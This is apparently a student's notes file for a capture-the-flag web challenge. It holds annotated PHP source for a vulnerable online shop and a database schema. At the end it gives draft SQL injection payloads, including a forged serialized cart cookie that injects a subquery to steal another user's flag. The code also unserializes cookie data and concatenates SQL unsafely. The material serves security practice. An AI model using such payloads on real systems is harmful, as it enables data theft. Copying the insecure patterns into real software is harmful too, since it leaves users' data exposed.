@@ -1,0 +1,341 @@
+Can you buy the flag of the user Wendi? Here's the online shop: https://web3.chall.necst.it/
+
+
+index.php>>>
+
+<?php
+
+require_once('../session.util.php');
+require_once('../db.util.php');
+
+$user = validate_session();
+
+if($user) {
+    $allowed_pages = ['store', 'cart', 'purchases', 'logout'];    \\\\\\\\\\\存在user的话 可以进入 store cart purchases logout页面
+    $default_page = 'store';
+} else {
+    $allowed_pages = ['login', 'register'];                       \\\\\\\\\\\不存在只能进login 和注册
+    $default_page = 'login';
+}
+
+if(!in_array($_GET['p'], $allowed_pages)) {                         \\\\\\\\\\\\\\\
+    $page = $default_page;
+} else {
+    $page = $_GET['p'];
+}
+
+if($page == 'logout') {                                         \\\\\\\\\\\\\\\\\页面为logout时
+    logout();
+    header('Location: /');
+    die();
+}
+
+try {
+    require_once('../pages/' . $page . '.inc.php');                         \\\\\\\\\\调用。inc.php
+} catch(Exception $e) {
+    $errmsg = $e->getMessage();
+}
+
+require_once('../templates/base.tpl.php');
+
+?>
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+db.util.php>>>
+
+
+<?php
+
+$db = new mysqli(getenv("DB_HOST"), getenv("DB_USER"), getenv("DB_PASSWORD"), getenv("DB_DATABASE"));   \\\\\\\\\\\\\\\获取环境变量
+
+if($db->connect_errno) {
+    throw new Exception('Failed to connect to the database');                                           \\\\\\\\\\\\\\\链接错误
+}
+
+class Product {                                                                                         \\\\\\\\\\\\\\\product的构成  ID  name  des  price
+    public $id;
+    public $name;
+    public $description;
+    public $price;
+
+    function __construct($id, $name, $description, $price) {
+        $this->id = $id;
+        $this->name = $name;
+        $this->description = $description;
+        $this->price = $price;
+    }
+
+}
+
+class Cart {                                                                                         \\\\\\\\\\\\\\变量 CART 包含 total_cost \products
+    public $total_cost;
+    public $products;
+
+    function __construct() {
+        $this->total_cost = 0;
+        $this->products = array();
+    }
+
+}
+
+class Purchase {                                                                                      \\\\\\\\\\\\\\\\变量Purchase id date total_cost success
+    public $id;
+    public $date;
+    public $total_cost;
+    public $success;
+
+    function __construct($id, $date, $total_cost, $success) {
+        $this->id = $id;
+        $this->date = $date;
+        $this->total_cost = $total_cost;
+        $this->success = $success;
+    }
+}
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+function create_user($username, $password) {                                             \\\\\\\\\\\\\\创建
+    global $db;
+
+    if(!preg_match('/^[A-Za-z0-9\.]+$/', $username)) {                                    \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\username 不可以包含特殊字符 只能是字母数字
+        throw new Exception('Username contains forbidden characters');
+    }
+
+    $pwhash = password_hash($password, PASSWORD_BCRYPT);                                     \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\密码经过hash编码
+    $res = $db->query("insert into users (username, password) values ('" . $username . "', '" . $pwhash . "');");
+
+    return $res;
+}
+
+function verify_password($username, $password) {                                        \\\\\\\\\\\\\\\\\验证密码
+    global $db;
+
+    if(!preg_match('/^[A-Za-z0-9\.]+$/', $username)) {
+        throw new Exception('Username contains forbidden characters');
+    }
+
+    $res = $db->query("select password from users where username = '" . $username . "';");            \\\\\\\\\\RES 为查询user的密码函数
+    if($res && $row = $res->fetch_row()) {
+        return password_verify($password, $row[0]);                                      \\\\\\\\\\\\返回调用psw_verify  ====》密码与hash值比较
+    }
+
+    return false;
+}
+
+function get_user_id_by_name($username) {                                              \\\\\\\\\\\\\\一摸一样 把psw换成 id
+    global $db;
+
+    if(!preg_match('/^[A-Za-z0-9\.]+$/', $username)) {
+        throw new Exception('Username contains forbidden characters');
+    }
+
+    $res = $db->query("select id from users where username = '$username';");
+    if($res && $row = $res->fetch_row()) {
+        return $row[0];
+    }
+
+    throw new Exception('User not found');
+}
+
+function get_product_list() {
+    global $db;
+
+    $prod_list = array();
+    $res = $db->query("select * from product;");
+    if(!$res) {
+        throw new Exception("Failed to retrieve product list");
+    }
+    while($row = $res->fetch_assoc()) {
+        array_push($prod_list, new Product($row['id'], $row['name'], $row['description'], $row['price']));
+    }
+    return $prod_list;
+}
+
+function get_product_by_id($id) {
+    global $db;
+
+    $res = $db->query("select * from product where id = $id limit 1");
+    if($res && $row = $res->fetch_assoc()) {
+        return new Product($row['id'], $row['name'], $row['description'], $row['price']);
+    } else {
+        throw new Exception("Failed to retrieve product");
+    } 
+}
+
+function add_to_cart($product_id) {
+    $cart = get_session_cart();
+    $product = get_product_by_id((int) $product_id);                                 \\\\\\\\\\\\\\\\\\\\\\\\购物车中的产品录入是通过id查找的
+    array_push($cart->products, $product);
+    $cart->total_cost = $cart->total_cost + $product->price;
+    update_session_cart($cart);
+}
+
+function purchase_cart($user_id) {
+    global $db;
+
+    $cart = get_session_cart();
+    if(empty($cart->products)) {
+        throw new Exception("Cannot complete purchase - cart is empty");
+    }
+
+    /* Prepare the order */
+    $date = date("Y-m-d H:i");
+    $res = $db->query("insert into purchases (user_id, date, total_price, success) values ($user_id, '$date', $cart->total_cost, FALSE);");       \\\\\\\\\\\\\\\\\\\\\\\\\\ overwrite
+    if(!$res) {
+        print_r($db->error);
+        throw new Exception('Cannot create purchase');
+    }
+    $lid = $db->insert_id;
+    foreach($cart->products as $product) {
+        $pid = (int) $product->id;
+        $res = $db->query("insert into purchase_item (purchase_id, item_id) values ($lid, $pid)");
+        if(!$res) {
+            throw new Exception('Cannot associate item to purchase');
+        }
+    }
+
+    /* Check that the price of the items is not changed in the meantime */
+    $res = $db->query("select sum(product.price) as sop from purchase_item left join product on purchase_item.item_id = product.id where purchase_item.purchase_id = $lid;");
+    if($res && $row = $res->fetch_assoc()) {
+        if((int) $row['sop'] === $cart->total_cost) {
+            $res = $db->query("update purchases set success = TRUE where id = $lid;");
+            if(!$res) {
+                throw new Exception('Cannot update purchase');
+            }
+            return true;
+        }
+    } else {
+        throw new Exception('Cannot compute total cost');
+    }
+    return false;
+}
+
+function get_purchases($user_id) {
+    global $db;
+    
+    $purchases = array();
+
+    $res = $db->query("select * from purchases where user_id = $user_id");
+    if(!$res) {
+        throw new Exception("Failed to retrieve purchases");
+    }
+    while($row = $res->fetch_assoc()) {
+        array_push($purchases, new Purchase($row['id'], $row['date'], $row['total_price'], $row['success']));
+    }
+
+    return $purchases;    
+}
+
+?>
+
+
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+session.util.php>>>
+
+<?php
+
+function get_session_cart() {
+    if(isset($_COOKIE['cart'])) {
+        return unserialize(base64_decode($_COOKIE['cart']));                             \\\\\\\\\\\\\\\\\\\\\\\\\base64_decode 解码cookie
+    } else {
+        return new Cart();
+    }
+}
+
+function update_session_cart($cart) {
+    setcookie('cart', base64_encode(serialize($cart)));                                    \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ base64 编码
+}
+
+function validate_session() {
+    $s = session_start();
+    if(isset($_SESSION['username'])) {
+        return $_SESSION['username'];
+    } 
+    return false;
+}
+
+function create_session($username) {
+    logout();
+    session_start();
+    session_regenerate_id();
+    $_SESSION['username'] = $username;
+}
+
+function destroy_cart() {
+    if (isset($_COOKIE['cart'])) {
+        unset($_COOKIE['cart']);
+        setcookie('cart', '', time() - 3600, '/');                                        \\\\\\\\\\\\\\\destroy cart
+    }
+}
+
+function logout() {
+    session_destroy();
+}
+
+?>
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+
+01-SCHEMA.sql>>>
+
+CREATE TABLE users (
+    id INTEGER PRIMARY KEY AUTO_INCREMENT,
+    username VARCHAR(255) NOT NULL,
+    password VARCHAR(255) NOT NULL
+);
+
+CREATE TABLE product (
+    id INTEGER PRIMARY KEY AUTO_INCREMENT,
+    name VARCHAR(255) NOT NULL,
+    description VARCHAR(255),
+    price INTEGER
+);
+
+CREATE TABLE purchases (
+    id INTEGER PRIMARY KEY AUTO_INCREMENT,
+    user_id INTEGER REFERENCES users(id),
+    date VARCHAR(255),
+    total_price INTEGER,
+    success BOOLEAN
+);
+
+CREATE TABLE purchase_item (
+    id INTEGER PRIMARY KEY AUTO_INCREMENT,
+    purchase_id INTEGER REFERENCES purchases(id),
+    item_id INTEGER REFERENCES product(id)
+);
+
+CREATE TABLE flag (
+    user_id INTEGER REFERENCES users(id),
+    flag VARCHAR(255),
+    PRIMARY KEY (user_id, flag)
+);
+
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+
+
+ $res = $db->query("insert into purchases (user_id, date, total_price, success) values ($user_id, '$date', 
+
+                                                                            1,FALSE),select flag.user_id,'date',flag.flag,sucess from flag;");--
+ 
+ 
+                                                                                                                $cart->total_cost, FALSE);"); 
+
+
+ $res = $db->query("insert into purchases (user_id, date, total_price, success) values ($user_id, '$date', 
+
+                                                                            1,FALSE) UNION insert into purchases (user_id,total_cost) select user_id,flag from flag;");--
+
+                                                                            10000,FALSE),(select id from users where username = 'Wendi' ,'date',select flag.flag from flag,users where flag.user_id = users.id and users.username = 'Wendi'
+                                                                            5000,FALSE),((select id from users where username = 'Wendi' limit 1), 'date', (select cast(flag.flag as unsigned) from flag union users whereflag.user_id = users.id and users.username = 'Wendi')
+
+                                                                            
+                                                                                                                   , FALSE);"); 
+
+
+
+O:4:"Cart":2:{s:10:"total_cost";s:188:"5000,FALSE),((select id from users where username = 'Wendi' limit 1), 'date', (select cast(flag.flag as unsigned) from flag, users where flag.user_id=users.id and users.username = 'Wendi')";s:8:"products";a:1:{i:0;O:7:"Product":4:{s:2:"id";s:1:"2";s:4:"name";s:15:"Hercules arrows";s:11:"description";s:68:"Arrows wielded by Hercules that were coated in poisonous Hydra blood";s:5:"price";s:4:"5000";}}}
+
